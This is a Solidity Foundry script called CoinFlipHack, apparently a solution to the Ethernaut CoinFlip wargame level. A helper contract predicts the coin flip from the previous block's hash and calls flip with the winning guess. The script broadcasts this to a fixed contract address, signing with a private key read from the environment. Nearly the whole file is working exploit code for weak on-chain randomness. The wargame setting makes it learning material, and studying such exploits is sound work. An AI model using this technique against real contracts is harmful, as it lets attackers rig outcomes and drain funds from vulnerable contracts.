// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {CoinFlip} from "../src/CoinFlip.sol";

contract Player {
    uint256 FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(CoinFlip coinflip) {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        bool guess = blockValue / FACTOR == 1 ? true : false;

        coinflip.flip(guess);

    }
}

contract CoinFlipHack is Script {
    CoinFlip public coinFlip =
        CoinFlip(payable(0xDa7B2FB7ac2f26ebeeF171147cD464442Ea72223));

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Player(coinFlip);
        console.log("consecutive wins", coinFlip.consecutiveWins());
        vm.stopBroadcast();
    }
}


// forge script script/CoinFlip.s.sol -vv --tc CoinFlipHack --broadcast
